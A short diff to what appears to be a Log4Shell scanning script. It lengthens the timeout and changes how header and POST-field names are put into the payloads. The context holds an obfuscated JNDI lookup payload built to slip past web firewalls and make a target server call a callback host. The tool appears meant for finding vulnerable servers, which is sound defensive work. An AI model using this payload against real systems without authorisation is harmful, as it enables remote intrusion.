@@ -48,7 +48,7 @@ default_headers = {
 }
 
 post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
-timeout = 4
+timeout = 10
 
 waf_bypass_payloads = [
     "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://#####.1.${hostName}.{{callback_host}}/{{random}}}",
@@ -164,7 +164,7 @@ def get_fuzzing_headers(payload):
             i = i.strip()
             if i == "" or i.startswith("#"):
                 continue
-            fuzzing_headers.update({i: payload.replace("#####", "header-" + i.lower())})
+            fuzzing_headers.update({i: payload.replace("#####", "header." + i.lower().replace("_", "").replace("-", ""))})
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
@@ -176,7 +176,7 @@ def get_fuzzing_headers(payload):
 def get_fuzzing_post_data(payload, method):
     fuzzing_post_data = {}
     for i in post_data_parameters:
-        fuzzing_post_data.update({i: payload.replace("#####", method + "-" + i)})
+        fuzzing_post_data.update({i: payload.replace("#####", method + "." + i.replace("_", "").replace("-", ""))})
     return fuzzing_post_data
 
 
